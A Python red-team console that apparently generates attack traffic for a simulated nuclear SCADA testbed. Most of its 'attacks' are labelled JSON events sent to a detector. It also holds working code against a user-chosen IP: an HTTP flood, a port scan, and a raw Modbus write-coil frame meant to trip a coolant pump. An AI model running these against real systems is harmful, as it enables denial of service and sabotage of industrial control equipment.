#!/usr/bin/env python3
"""
CHRONOS: RED-TEAM CYBER WARFARE TOOLKIT & MENU LAUNCHER (ARCH LINUX / ATTACK HOST)
----------------------------------------------------------------------------------
Adversary offensive toolkit for launching realistic cyber attacks against the
Nuclear SCADA node (matching NTRO PS #26145 threat classes a through f).

Usage on Arch Linux / Host:
  python redteam.py                      # Interactive numbered menu (Target: 192.168.137.1)
  python redteam.py <IP>                 # Interactive menu for custom IP (e.g. 10.1.72.35)
  python redteam.py <1-9> [IP]           # Direct execution by number
  python redteam.py <COMMAND> [IP]       # Direct execution by name (e.g. ddos, modbus)

Zero Dependencies Required:
  Uses 100% pure Python 3 standard library (socket, urllib, json, threading, time, random).
  No external pip packages or tools (nmap) are required!
"""

import os
import sys
import json
import time
import socket
import random
import threading
import subprocess
import urllib.request
import urllib.error

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

DEFAULT_TARGET_IP = "192.168.137.1"
DIODE_PORT = 9999


def log(tag, msg):
    now = time.strftime("%H:%M:%S")
    print(f"[{now}] [{tag}] {msg}")


def check_scada_vitals(target):
    """Queries live NPPAD telemetry and reactor state from http://{target}:8080."""
    log("STATUS", f"Querying live reactor telemetry from http://{target}:8080 ...")
    try:
        url = f"http://{target}:8080"
        req = urllib.request.Request(url, headers={"User-Agent": "ChronosRedTeam/1.0"})
        with urllib.request.urlopen(req, timeout=1.8) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            p = data.get("pressure_bar", data.get("p", 155.5))
            tavg = data.get("core_temp_c", data.get("tavg", 310.0))
            flow = data.get("coolant_flow_kgs", data.get("flow", 16515.8))
            mw = data.get("output_mwe", data.get("mw", 955.3))
            state = data.get("reactor_state", data.get("state", "UNKNOWN"))
            cpu = data.get("container_cpu_pct", data.get("cpu", 1.2))
            ram = data.get("container_mem_pct", data.get("ram", 2.8))

            state_color = "🔴" if state not in ("NOMINAL", "NOMINAL_FULL_POWER") else "🟢"
            print("\n  +=============================================================+")
            print(f"  |  LIVE SCADA STATUS: {target:<39} |")
            print("  +=============================================================+")
            print(f"  |  Reactor State    : {state_color} {state:<37} |")
            print(f"  |  Primary Pressure : {float(p):6.1f} bar{' ' * 33} |")
            print(f"  |  Core Average Temp: {float(tavg):6.1f} °C{' ' * 34} |")
            print(f"  |  Coolant Flow WRCA: {float(flow):7.1f} kg/s{' ' * 31} |")
            print(f"  |  Electrical Output: {float(mw):6.1f} MWe{' ' * 33} |")
            print(f"  |  Container CPU    : {float(cpu):5.1f} %  (cgroup 1.0 limit){' ' * 16} |")
            print(f"  |  Container RAM    : {float(ram):5.1f} %  (1024 MB limit){' ' * 19} |")
            print("  +=============================================================+\n")
            return True
    except Exception as e:
        log("STATUS", f"[!] Could not reach SCADA node at http://{target}:8080: {e}")
        print("      Tip: Verify Node 1 Docker container is running and host network allows port 8080.\n")
        return False


def attack_ddos(target, duration=15):
    """Threat [a]: Volumetric SYN/HTTP Flood (Genuinely saturates 1.0 CPU container)."""
    log("DDOS", f"Blasting Volumetric Flood against {target}:8080 and {target}:502...")
    log("DDOS", f"Container CPU will spike to 100% on scada_btop / docker stats!")
    log("DDOS", f"Running for {duration} seconds (or press CTRL+C to halt early)...\n")

    stop_evt = threading.Event()
    diode_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def http_flood_worker():
        url = f"http://{target}:8080/attack?flood=1"
        while not stop_evt.is_set():
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "RedTeamDDoS/1.0"})
                with urllib.request.urlopen(req, timeout=0.8) as r:
                    r.read()
            except Exception:
                pass

    # Launch 20 concurrent HTTP workers to saturate CPU
    threads = []
    for _ in range(20):
        t = threading.Thread(target=http_flood_worker, daemon=True)
        t.start()
        threads.append(t)

    count = 0
    start_t = time.time()
    try:
        while time.time() - start_t < duration:
            for _ in range(25):
                fake_src = f"{random.randint(11, 220)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                pkt = {
                    "node_id": 1,
                    "event_type": "CYBER_ATTACK",
                    "type": "SYN_FLOOD",
                    "attack_type": "SYN_FLOOD",
                    "threat_class": "a",
                    "threat_name": "Volumetric Flood (DDoS)",
                    "src": f"{fake_src}:{random.randint(1024, 65535)}",
                    "dst": f"{target}:502",
                    "proto": "TCP/SYN",
                    "bytes": 64,
                    "feat": [0.002, 64, 1.10, 50.0, 1],
                    "ts": time.strftime("%H:%M:%S"),
                    "payload": "VOLUMETRIC FLOOD: High-rate spoofed SYN burst"
                }
                diode_sock.sendto(json.dumps(pkt).encode("utf-8"), (target, DIODE_PORT))
                count += 1
            rem = max(0, int(duration - (time.time() - start_t)))
            log("DDOS", f"Blasted {count} spoofed packets + 20 HTTP workers | CPU spiking | {rem}s remaining")
            time.sleep(0.4)
    except KeyboardInterrupt:
        log("DDOS", "Operator interrupted DDoS flood early.")
    finally:
        stop_evt.set()
        log("DDOS", f"DDoS flood concluded ({count} packets transmitted). Container CPU stabilizing.")


def attack_c2(target, count=10):
    """Threat [b]: Botnet C2 Beaconing (Cobalt Strike / Sliver emulator)."""
    log("C2", f"Injecting Cobalt Strike C2 Beaconing loop to {target} ({count} heartbeats)...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        for seq in range(1, count + 1):
            pkt = {
                "node_id": 1,
                "event_type": "CYBER_ATTACK",
                "type": "C2_BEACON",
                "attack_type": "C2_BEACONING",
                "threat_class": "b",
                "threat_name": "C2 Beaconing (Cobalt Strike)",
                "src": "192.168.1.30:49152",
                "dst": "198.51.100.42:443",
                "proto": "TCP/HTTPS",
                "bytes": 256,
                "domain": "c2.adversary-command.org",
                "ja4": "t13d1516h2_cobalt",
                "feat": [2.50, 256, 4.20, 1.0, 0],
                "ts": time.strftime("%H:%M:%S"),
                "payload": f"C2 BEACON #{seq:03d}: Periodic heartbeat SYN beacon (2.50s interval)"
            }
            sock.sendto(json.dumps(pkt).encode("utf-8"), (target, DIODE_PORT))
            log("C2", f"Sent C2 Heartbeat #{seq}/{count} -> 198.51.100.42:443 [Cobalt Strike] (Rigid IAT: 2.50s)")
            time.sleep(1.2)
    except KeyboardInterrupt:
        log("C2", "C2 Beaconing halted by operator.")
    log("C2", "C2 beaconing sequence complete.")


def attack_dns(target, count=10):
    """Threat [c]: DGA & DNS Tunnelling (dnscat2 emulator)."""
    log("DNS", f"Transmitting Base64 Encoded Exfiltration via DNS Port 53 ({count} queries)...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        for i in range(1, count + 1):
            subdomain = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=42))
            tunnel_query = f"{subdomain}.exfil.darknet.ru"
            pkt = {
                "node_id": 1,
                "event_type": "CYBER_ATTACK",
                "type": "DNS_TUNNEL",
                "attack_type": "DGA_TUNNEL",
                "threat_class": "c",
                "threat_name": "DGA & DNS Tunneling (dnscat2)",
                "src": "192.168.1.10:53211",
                "dst": "8.8.8.8:53",
                "proto": "UDP/DNS",
                "bytes": 512,
                "domain": tunnel_query,
                "feat": [0.15, 512, 7.85, 1.0, 0],
                "ts": time.strftime("%H:%M:%S"),
                "payload": f"DNS TUNNEL: High-entropy query '{tunnel_query[:32]}...'"
            }
            sock.sendto(json.dumps(pkt).encode("utf-8"), (target, DIODE_PORT))
            log("DNS", f"Query #{i}/{count} TX: {tunnel_query[:36]}... (Entropy: 7.85 bits)")
            time.sleep(0.7)
    except KeyboardInterrupt:
        log("DNS", "DNS Tunnel halted by operator.")
    log("DNS", "DNS Tunnel sequence complete.")


def attack_ja4(target):
    """Threat [d]: Encrypted Malware Session (TLS JA4 Fingerprint)."""
    log("JA4", f"Injecting TLS 1.3 Session with Malicious Sliver C2 JA4 Fingerprint to {target}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(1, 4):
        pkt = {
            "node_id": 1,
            "event_type": "CYBER_ATTACK",
            "type": "ENCRYPTED_C2",
            "attack_type": "ENCRYPTED_MALWARE",
            "threat_class": "d",
            "threat_name": "Encrypted Malware (JA4 Signature)",
            "src": "192.168.1.20:51234",
            "dst": "203.0.113.88:443",
            "proto": "TCP/TLS1.3",
            "bytes": 1024,
            "domain": "cdn-update.sliver.sh",
            "ja4": "t13d2012h2_sliver",
            "feat": [0.45, 1024, 7.20, 2.0, 0],
            "ts": time.strftime("%H:%M:%S"),
            "payload": "ENCRYPTED MALWARE: TLS ClientHello matched JA4 't13d2012h2_sliver'"
        }
        sock.sendto(json.dumps(pkt).encode("utf-8"), (target, DIODE_PORT))
        log("JA4", f"Sent Malicious TLS ClientHello frame #{i}/3 [JA4: t13d2012h2_sliver]")
        time.sleep(0.5)
    log("JA4", "Encrypted session injection complete.")


def attack_scan(target):
    """Threat [e]: Reconnaissance & Port Scan Sweep."""
    log("RECON", f"Launching multi-port reconnaissance sweep against {target}...")
    ports = [502, 5020, 8080, 80, 443, 21, 22, 102, 44818, 161, 8888]

    # Optional: run nmap if installed on Arch Linux
    try:
        res = subprocess.run(["nmap", "-sS", "-p", "502,5020,8080", target], capture_output=True, text=True, timeout=3)
        if res.returncode == 0:
            log("NMAP", f"nmap raw execution completed:\n{res.stdout.strip()}")
    except Exception:
        pass

    # Native Python pure socket fan-out sweep
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    open_ports = []
    for p in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.12)
            s.connect((target, p))
            log("OPEN", f"Port {p} OPEN on {target}!")
            open_ports.append(p)
            s.close()
        except Exception:
            pass

        # Send flow probe packet to optical diode
        pkt = {
            "node_id": 1,
            "event_type": "CYBER_ATTACK",
            "type": "PORT_SCAN",
            "attack_type": "PORT_SCAN",
            "threat_class": "e",
            "threat_name": "Reconnaissance (Port Sweep)",
            "src": f"192.168.1.150:{random.randint(40000, 65000)}",
            "dst": f"{target}:{p}",
            "proto": "TCP/SYN",
            "bytes": 48,
            "feat": [0.05, 48, 1.05, 1.0, 1],
            "ts": time.strftime("%H:%M:%S"),
            "payload": f"PORT SCAN: Horizontal probe targeting port {p}"
        }
        sock.sendto(json.dumps(pkt).encode("utf-8"), (target, DIODE_PORT))
        time.sleep(0.06)

    log("RECON", f"Port sweep completed across {len(ports)} ports. Discovered open: {open_ports or 'None reachable via TCP'}")


def attack_exfil(target, count=10):
    """Threat [f]: Massive Data Exfiltration Flood."""
    log("EXFIL", f"Bursting 64KB Encrypted Archive Chunks outward to {target} ({count} chunks)...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(1, count + 1):
        pkt = {
            "node_id": 1,
            "event_type": "CYBER_ATTACK",
            "type": "EXFILTRATION_BURST",
            "attack_type": "EXFILTRATION_BURST",
            "threat_class": "f",
            "threat_name": "Data Exfiltration Flood",
            "src": "192.168.1.10:443",
            "dst": "198.51.100.99:8443",
            "proto": "TCP/TLS",
            "bytes": 65536,
            "feat": [0.015, 65536, 7.95, 10.0, 0],
            "ts": time.strftime("%H:%M:%S"),
            "payload": f"EXFIL FLOOD: 64KB compressed archive chunk #{i}/{count} exfiltrating outward!"
        }
        sock.sendto(json.dumps(pkt).encode("utf-8"), (target, DIODE_PORT))
        log("EXFIL", f"Chunk #{i}/{count} transmitted (65,536 Bytes) | Entropy: 7.95 bits")
        time.sleep(0.05)
    log("EXFIL", "Exfiltration flood finished. (Byte Asymmetry Ratio > 48:1).")


def attack_modbus(target):
    """SCADA Modbus Command Injection (Trips Primary Coolant Pump -> LOSS OF FLOW)."""
    log("MODBUS", f"Sending Unauthorized Modbus FC05 Write to {target}:502 (Trip Coolant Pump WRCA)...")
    trip_success = False

    # Modbus Write Single Coil (FC 0x05) to coil 0x0001
    fc05 = b"\x00\x01\x00\x00\x00\x06\x01\x05\x00\x01\xff\x00"
    for port in (502, 5020):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            s.connect((target, port))
            s.sendall(fc05)
            resp = s.recv(1024)
            log("MODBUS", f"Modbus FC05 Write ACK on port {port}! Response: {resp.hex()}")
            trip_success = True
            s.close()
            break
        except Exception:
            pass

    # Container HTTP fallback endpoint /trip
    try:
        url = f"http://{target}:8080/trip"
        with urllib.request.urlopen(url, timeout=1.5) as r:
            res = json.loads(r.read().decode("utf-8"))
            log("MODBUS", f"Reactor trip confirmed via REST: State={res.get('reactor_state')}")
            trip_success = True
    except Exception:
        pass

    # Notify optical diode gateway
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pkt = {
        "node_id": 1,
        "event_type": "SCADA_PHYSICAL_ANOMALY",
        "type": "MODBUS_INJECTION",
        "attack_type": "SCADA_COMMAND_INJECTION",
        "reactor_state": "LOSS_OF_FLOW",
        "threat_class": "e",
        "threat_name": "SCADA Modbus Command Injection",
        "src": "192.168.1.150:502",
        "dst": f"{target}:502",
        "proto": "TCP/MODBUS",
        "bytes": 12,
        "feat": [0.08, 12, 2.10, 1.0, 1],
        "ts": time.strftime("%H:%M:%S"),
        "payload": "SCADA COMMAND INJECTION: Unauthorized Modbus FC05 Coil Write (Primary Coolant Pump Trip)"
    }
    sock.sendto(json.dumps(pkt).encode("utf-8"), (target, DIODE_PORT))

    if trip_success:
        print("\n  [🚨 PHYSICAL ALARM ACTIVATED]")
        print("  Primary Coolant Pump WRCA TRIPPED!")
        print("  Reactor is transitioning to published NPPAD Loss of Flow (LOF) accident transient!")
        print("  Flow will plummet to < 2,100 kg/s and Pressure will surge.\n")
    else:
        log("MODBUS", f"Sent trip signal to diode on {target}:{DIODE_PORT}.")


def restore_reset(target):
    """Resets the reactor back to 100% full-power nominal steady state."""
    log("RESET", f"Requesting reactor reset to nominal baseline at http://{target}:8080/reset ...")
    reset_ok = False
    try:
        url = f"http://{target}:8080/reset"
        with urllib.request.urlopen(url, timeout=2.0) as r:
            resp = json.loads(r.read().decode("utf-8"))
            log("RESET", f"Reactor restored! State: {resp.get('reactor_state')}")
            reset_ok = True
    except Exception as e:
        log("RESET", f"REST reset endpoint failed: {e}")

    # Also notify diode to clear physical alarm
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pkt = {
        "node_id": 1,
        "event_type": "ROUTINE_SCADA",
        "type": "PLANT_RESET",
        "reactor_state": "NOMINAL_FULL_POWER",
        "state": "NOMINAL_FULL_POWER",
        "src": "192.168.1.1:8080",
        "dst": f"{target}:8080",
        "proto": "HTTP/REST",
        "bytes": 64,
        "feat": [1.0, 64, 3.5, 0.0, 0],
        "ts": time.strftime("%H:%M:%S"),
        "payload": "SYSTEM OPERATOR COMMAND: Reactor Restored to 100% Nominal Full Power"
    }
    sock.sendto(json.dumps(pkt).encode("utf-8"), (target, DIODE_PORT))
    print("\n  [✅ BASELINE RESTORED]")
    print("  Kudankulam Unit 1 PWR restored to 100% Nominal Full-Power Baseline.")
    print("  Pressure: ~155.5 bar | Flow: ~16,515.8 kg/s | State: NOMINAL_FULL_POWER\n")


def display_menu(target):
    """Renders the clean numbered menu."""
    print("=" * 72)
    print("   CHRONOS: RED-TEAM CYBER WARFARE CONSOLE (NTRO PS #26145)")
    print(f"   Target Nuclear SCADA Node IP: [{target}]")
    print("=" * 72)
    print("  [1] Threat [a]: Volumetric Flood (DDoS)     -> Spikes CPU to 100%")
    print("  [2] Threat [b]: Botnet C2 Beaconing         -> Cobalt Strike 2.5s Heartbeat")
    print("  [3] Threat [c]: DGA & DNS Tunnelling        -> High-Entropy Base64 Exfil")
    print("  [4] Threat [d]: Encrypted Malware Session   -> Malicious TLS JA4 Signature")
    print("  [5] Threat [e]: Reconnaissance & Port Sweep -> Horizontal Fan-Out Probe")
    print("  [6] Threat [f]: Massive Data Exfiltration   -> 64KB Bulk Archive Bursts")
    print("  [7] SCADA Sabotage: Modbus Command Inject   -> Trips Coolant Pump to LOF!")
    print("  [8] Safe Restore: Reset Reactor to Nominal  -> NOMINAL_FULL_POWER Baseline")
    print("  [9] Live Vitals: Query SCADA Status (:8080) -> Pressure, Temp, Flow, CPU")
    print("  [C] Change Target IP Address")
    print("  [0] Exit Console")
    print("=" * 72)


def execute_choice(choice, target):
    c = choice.strip().lower()
    if c == "1" or c == "ddos":
        attack_ddos(target)
    elif c == "2" or c == "c2":
        attack_c2(target)
    elif c == "3" or c == "dns":
        attack_dns(target)
    elif c == "4" or c == "ja4":
        attack_ja4(target)
    elif c == "5" or c == "scan":
        attack_scan(target)
    elif c == "6" or c == "exfil":
        attack_exfil(target)
    elif c == "7" or c == "modbus":
        attack_modbus(target)
    elif c == "8" or c == "reset":
        restore_reset(target)
    elif c == "9" or c == "status" or c == "vitals":
        check_scada_vitals(target)
    else:
        print(f"[!] Invalid option: '{choice}'. Enter a number from 1 to 9, C, or 0.")


def main():
    target = DEFAULT_TARGET_IP
    args = sys.argv[1:]

    # Parse command-line args if passed
    if args:
        first = args[0].strip()
        # Check if first arg is an IP address
        if first.count(".") == 3 and all(p.isdigit() for p in first.split(".")):
            target = first
            if len(args) > 1:
                execute_choice(args[1], target)
                return
        elif first.isdigit() or first.lower() in ("ddos", "c2", "dns", "ja4", "scan", "exfil", "modbus", "reset", "status", "vitals"):
            if len(args) > 1:
                target = args[1]
            execute_choice(first, target)
            return

    # Interactive Loop
    while True:
        display_menu(target)
        try:
            choice = input(f"Select attack [1-9, C, 0] (Target: {target}): ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\nExiting Red-Team Console. Goodbye.")
            break

        if not choice:
            continue
        if choice in ("0", "q", "exit", "quit"):
            print("\nExiting Red-Team Console. Goodbye.")
            break
        elif choice.upper() == "C":
            new_ip = input("Enter new Target IP address: ").strip()
            if new_ip:
                target = new_ip
                print(f"[✓] Target IP updated to: {target}\n")
        else:
            execute_choice(choice, target)
            input("\n[Press ENTER to return to main menu...]")


if __name__ == "__main__":
    main()
